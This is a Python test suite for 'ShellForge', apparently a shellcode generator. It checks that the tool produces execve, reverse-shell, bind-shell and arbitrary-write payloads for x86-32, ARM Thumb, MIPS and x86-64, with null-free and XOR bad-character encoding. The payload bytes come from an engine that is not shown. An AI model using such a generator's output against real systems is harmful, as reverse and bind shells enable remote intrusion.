"""
test_phase3.py
──────────────
Phase 3 tests: x86-32, ARM Thumb, MIPS BE synthesis
+ architecture profile table validation.
"""
import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../../"))

from python.engine.shellforge_bridge import (
    ShellForge, Constraints, Arch, OS, Goal, Encoding, SFStatus
)

PASS="✅"; FAIL="❌"
results=[]

def test(name, fn):
    try:
        fn()
        print(f"  {PASS} {name}")
        results.append((name,True,None))
    except Exception as e:
        print(f"  {FAIL} {name}: {e}")
        results.append((name,False,str(e)))

def run():
    print("\n── ShellForge Phase 3 Test Suite ────────────────────────\n")
    try:
        sf=ShellForge()
        print(f"  {PASS} Library loaded: {sf.version()}\n")
    except FileNotFoundError as e:
        print(f"  {FAIL} {e}"); return

    # ── T1: x86-32 Linux ─────────────────────────────────────
    print("[ T1 ] x86-32 Linux")

    def t1_exec():
        c=Constraints(arch=Arch.X86_32)
        r=sf.synthesize(c)
        assert r.ok, f"{r.status.name}: {r.error_msg}"
        assert r.payload_len > 0
        assert r.arch == Arch.X86_32
        print(f"       execve: {r.payload_len} bytes  {r.hex_escaped()}")
    test("x86-32 execve(/bin//sh)", t1_exec)

    def t1_revshell():
        c=Constraints(arch=Arch.X86_32, goal=Goal.REVERSE_SHELL)
        c.goal_args=["10.0.0.1:4444"]
        r=sf.synthesize(c)
        assert r.ok, f"{r.status.name}: {r.error_msg}"
        assert r.payload_len > 20
        print(f"       revshell: {r.payload_len} bytes")
    test("x86-32 reverse shell", t1_revshell)

    def t1_bind():
        c=Constraints(arch=Arch.X86_32, goal=Goal.BIND_SHELL)
        c.goal_args=["4444"]
        r=sf.synthesize(c)
        assert r.ok, f"{r.status.name}: {r.error_msg}"
        print(f"       bindshell: {r.payload_len} bytes")
    test("x86-32 bind shell", t1_bind)

    def t1_arb():
        c=Constraints(arch=Arch.X86_32, goal=Goal.ARBITRARY_WRITE)
        c.goal_args=["0x8048000","0xdeadbeef"]
        r=sf.synthesize(c)
        assert r.ok, f"{r.status.name}: {r.error_msg}"
        assert r.payload[-1]==0xc3, "Should end with ret"
        print(f"       arb write: {r.payload_len} bytes")
    test("x86-32 arbitrary write", t1_arb)

    def t1_null_free():
        c=Constraints(arch=Arch.X86_32, null_free=True)
        r=sf.synthesize(c)
        assert r.ok, f"{r.status.name}: {r.error_msg}"
        assert 0x00 not in r.payload, "Null in null-free output"
    test("x86-32 null-free constraint", t1_null_free)

    def t1_encode():
        c=Constraints(arch=Arch.X86_32)
        bad = [0x2f,0x62,0x69,0x6e,0x73,0x68]  # /bin//sh bytes
        for b in bad: c.add_bad_char(b)
        r=sf.synthesize(c)
        assert r.ok, f"{r.status.name}: {r.error_msg}"
        hits=[b for b in r.payload if b in bad]
        assert not hits, f"banned bytes in output: {[hex(b) for b in hits]}"
        assert r.payload_len > 24, "output should be larger than raw (encoded)"
        print(f"       encoded clean: {r.payload_len} bytes enc={r.encoding_used.name}")
    test("x86-32 bad char triggers encoder", t1_encode)

    # ── T2: ARM Thumb Linux ───────────────────────────────────
    print("\n[ T2 ] ARM Thumb Linux")

    def t2_exec():
        c=Constraints(arch=Arch.ARM)
        r=sf.synthesize(c)
        assert r.ok, f"{r.status.name}: {r.error_msg}"
        assert r.payload_len > 0
        assert r.arch==Arch.ARM
        print(f"       execve: {r.payload_len} bytes  {r.hex_escaped()}")
    test("ARM Thumb execve(/bin//sh)", t2_exec)

    def t2_revshell():
        c=Constraints(arch=Arch.ARM, goal=Goal.REVERSE_SHELL)
        c.goal_args=["192.168.1.1:9001"]
        r=sf.synthesize(c)
        assert r.ok, f"{r.status.name}: {r.error_msg}"
        print(f"       revshell: {r.payload_len} bytes")
    test("ARM Thumb reverse shell", t2_revshell)

    def t2_bind():
        c=Constraints(arch=Arch.ARM, goal=Goal.BIND_SHELL)
        c.goal_args=["1337"]
        r=sf.synthesize(c)
        assert r.ok, f"{r.status.name}: {r.error_msg}"
        print(f"       bindshell: {r.payload_len} bytes")
    test("ARM Thumb bind shell", t2_bind)

    def t2_arb():
        c=Constraints(arch=Arch.ARM, goal=Goal.ARBITRARY_WRITE)
        c.goal_args=["0x10000","0xcafebabe"]
        r=sf.synthesize(c)
        assert r.ok, f"{r.status.name}: {r.error_msg}"
        print(f"       arb write: {r.payload_len} bytes")
    test("ARM Thumb arbitrary write", t2_arb)

    def t2_xor():
        c=Constraints(arch=Arch.ARM)
        bad=[0x2f,0x62,0x69,0x6e,0x73,0x68]
        for b in bad: c.add_bad_char(b)
        r=sf.synthesize(c)
        assert r.ok, f"{r.status.name}: {r.error_msg}"
        hits=[b for b in r.payload if b in bad]
        assert not hits, f"banned bytes in output: {[hex(b) for b in hits]}"
        assert r.payload_len > 22
        print(f"       ARM encoded clean: {r.payload_len} bytes enc={r.encoding_used.name}")
    test("ARM Thumb XOR encoder", t2_xor)

    # ── T3: MIPS Big-Endian Linux ─────────────────────────────
    print("\n[ T3 ] MIPS Big-Endian Linux")

    def t3_exec():
        c=Constraints(arch=Arch.MIPS)
        r=sf.synthesize(c)
        assert r.ok, f"{r.status.name}: {r.error_msg}"
        assert r.payload_len > 0
        assert r.arch==Arch.MIPS
        # MIPS syscall instruction = 0x00 0x00 0x00 0x0c
        assert b'\x00\x00\x00\x0c' in r.payload
        print(f"       execve: {r.payload_len} bytes")
    test("MIPS BE execve(/bin//sh)", t3_exec)

    def t3_revshell():
        c=Constraints(arch=Arch.MIPS, goal=Goal.REVERSE_SHELL)
        c.goal_args=["10.10.10.1:4444"]
        r=sf.synthesize(c)
        assert r.ok, f"{r.status.name}: {r.error_msg}"
        print(f"       revshell: {r.payload_len} bytes")
    test("MIPS BE reverse shell", t3_revshell)

    def t3_bind():
        c=Constraints(arch=Arch.MIPS, goal=Goal.BIND_SHELL)
        c.goal_args=["8080"]
        r=sf.synthesize(c)
        assert r.ok, f"{r.status.name}: {r.error_msg}"
        print(f"       bindshell: {r.payload_len} bytes")
    test("MIPS BE bind shell", t3_bind)

    def t3_arb():
        c=Constraints(arch=Arch.MIPS, goal=Goal.ARBITRARY_WRITE)
        c.goal_args=["0x80400000","0xdeadbeef"]
        r=sf.synthesize(c)
        assert r.ok, f"{r.status.name}: {r.error_msg}"
        # Should end with nop delay slot (0x00000000)
        assert r.payload[-1]==0x00
        print(f"       arb write: {r.payload_len} bytes")
    test("MIPS BE arbitrary write", t3_arb)

    def t3_xor():
        c=Constraints(arch=Arch.MIPS)
        bad=[0x2f,0x62,0x69,0x6e,0x73,0x68]
        for b in bad: c.add_bad_char(b)
        r=sf.synthesize(c)
        assert r.ok, f"{r.status.name}: {r.error_msg}"
        hits=[b for b in r.payload if b in bad]
        assert not hits, f"banned bytes in output: {[hex(b) for b in hits]}"
        assert r.payload_len > 60
        print(f"       MIPS encoded clean: {r.payload_len} bytes enc={r.encoding_used.name}")
    test("MIPS BE XOR encoder", t3_xor)

    # ── T4: Cross-arch regression ─────────────────────────────
    print("\n[ T4 ] Phase 1+2 regression")

    def t4_x86_64_still_works():
        c=Constraints()
        r=sf.synthesize(c)
        assert r.ok and r.payload_len==26 and r.arch==Arch.X86_64
    test("x86-64 execve still 26 bytes", t4_x86_64_still_works)

    def t4_x86_64_revshell():
        c=Constraints(goal=Goal.REVERSE_SHELL)
        c.goal_args=["127.0.0.1:4444"]
        r=sf.synthesize(c)
        assert r.ok and r.payload_len==97
    test("x86-64 reverse shell still 97 bytes", t4_x86_64_revshell)

    def t4_all_arches_synthesise():
        for arch in [Arch.X86_64, Arch.X86_32, Arch.ARM, Arch.MIPS]:
            c=Constraints(arch=arch)
            r=sf.synthesize(c)
            assert r.ok, f"{arch.name} failed: {r.error_msg}"
    test("All 4 archs synthesise execve", t4_all_arches_synthesise)

    # ── Summary ───────────────────────────────────────────────
    passed=sum(1 for _,ok,_ in results if ok)
    total=len(results)
    print(f"\n── Results: {passed}/{total} passed ─────────────────────────\n")
    if passed<total:
        print("Failed:")
        for name,ok,msg in results:
            if not ok: print(f"  {FAIL} {name}: {msg}")
        sys.exit(1)
    else:
        print("All Phase 3 tests passed. Ready for Phase 4.\n")

if __name__=="__main__":
    run()
